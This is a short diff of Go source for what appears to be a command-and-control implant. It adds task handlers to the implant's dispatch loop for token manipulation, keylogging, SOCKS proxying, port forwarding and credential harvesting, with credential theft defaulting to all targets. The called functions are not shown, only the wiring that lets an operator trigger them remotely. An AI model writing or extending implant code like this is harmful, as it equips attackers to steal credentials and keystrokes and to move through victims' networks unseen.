@@ -223,6 +223,25 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 	case protocol.TaskPivot:
 		output, err = ExecutePivotCommand(task.Args)
 
+	case protocol.TaskToken:
+		output, err = ExecuteTokenCommand(task.Args)
+
+	case protocol.TaskKeylog:
+		output, err = ExecuteKeyloggerCommand(task.Args)
+
+	case protocol.TaskSocks:
+		output, err = ExecuteProxyCommand(task.Args)
+
+	case protocol.TaskPortFwd:
+		output, err = ExecutePortFwdCommand(task.Args)
+
+	case protocol.TaskCreds:
+		target := "all"
+		if len(task.Args) > 0 {
+			target = task.Args[0]
+		}
+		output, err = HarvestCredentials(target)
+
 	case protocol.TaskKill:
 		output = []byte("Agent terminating")
 
